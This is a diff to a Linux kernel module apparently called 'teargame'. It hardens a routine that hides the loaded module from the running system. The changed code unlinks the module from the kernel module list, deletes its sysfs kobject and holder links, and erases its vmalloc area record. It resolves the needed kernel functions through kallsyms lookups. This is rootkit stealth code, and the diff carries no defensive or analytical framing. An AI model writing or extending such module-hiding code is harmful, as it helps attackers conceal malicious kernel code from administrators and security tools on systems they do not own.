@@ -109,6 +109,21 @@ static int (*fn_task_work_add)(struct task_struct *task,
 static DEFINE_MUTEX(teargame_touch_lock);
 static bool teargame_module_hidden;
 
+static void teargame_list_del_init_nocheck(struct list_head *entry)
+{
+	struct list_head *prev;
+	struct list_head *next;
+
+	if (!entry || entry->next == entry || entry->prev == entry)
+		return;
+
+	prev = entry->prev;
+	next = entry->next;
+	next->prev = prev;
+	prev->next = next;
+	INIT_LIST_HEAD(entry);
+}
+
 static unsigned long teargame_lookup_symbol(const char *name)
 {
 	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
@@ -131,18 +146,25 @@ static unsigned long teargame_lookup_symbol(const char *name)
 static void teargame_hide_module_visibility(void)
 {
 	struct module_use *use, *tmp;
+	void (*fn_kobject_del)(struct kobject *kobj);
+	void (*fn_sysfs_remove_link)(struct kobject *kobj, const char *name);
 
 	if (teargame_module_hidden)
 		return;
+
+	fn_kobject_del = (void *)teargame_lookup_symbol("kobject_del");
+	fn_sysfs_remove_link = (void *)teargame_lookup_symbol("sysfs_remove_link");
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(6, 12, 0)
 	{
 		struct vmap_area *va, *vtmp;
 		struct list_head *vmap_area_list;
 		struct rb_root *vmap_area_root;
+		void (*fn_rb_erase)(struct rb_node *node, struct rb_root *root);
 
 		vmap_area_list = (struct list_head *)teargame_lookup_symbol("vmap_area_list");
 		vmap_area_root = (struct rb_root *)teargame_lookup_symbol("vmap_area_root");
+		fn_rb_erase = (void *)teargame_lookup_symbol("rb_erase");
 		if (vmap_area_list && vmap_area_root)
 		{
 			list_for_each_entry_safe(va, vtmp, vmap_area_list, list)
@@ -150,8 +172,9 @@ static void teargame_hide_module_visibility(void)
 				if ((unsigned long)THIS_MODULE > va->va_start &&
 					(unsigned long)THIS_MODULE < va->va_end)
 				{
-					list_del(&va->list);
-					rb_erase(&va->rb_node, vmap_area_root);
+					teargame_list_del_init_nocheck(&va->list);
+					if (fn_rb_erase)
+						fn_rb_erase(&va->rb_node, vmap_area_root);
 					break;
 				}
 			}
@@ -159,14 +182,16 @@ static void teargame_hide_module_visibility(void)
 	}
 #endif
 
-	list_del_init(&THIS_MODULE->list);
-	kobject_del(&THIS_MODULE->mkobj.kobj);
+	teargame_list_del_init_nocheck(&THIS_MODULE->list);
+	if (fn_kobject_del)
+		fn_kobject_del(&THIS_MODULE->mkobj.kobj);
 
 	list_for_each_entry_safe(use, tmp, &THIS_MODULE->target_list, target_list)
 	{
-		list_del(&use->source_list);
-		list_del(&use->target_list);
-		sysfs_remove_link(use->target->holders_dir, THIS_MODULE->name);
+		teargame_list_del_init_nocheck(&use->source_list);
+		teargame_list_del_init_nocheck(&use->target_list);
+		if (fn_sysfs_remove_link)
+			fn_sysfs_remove_link(use->target->holders_dir, THIS_MODULE->name);
 		kfree(use);
 	}
 
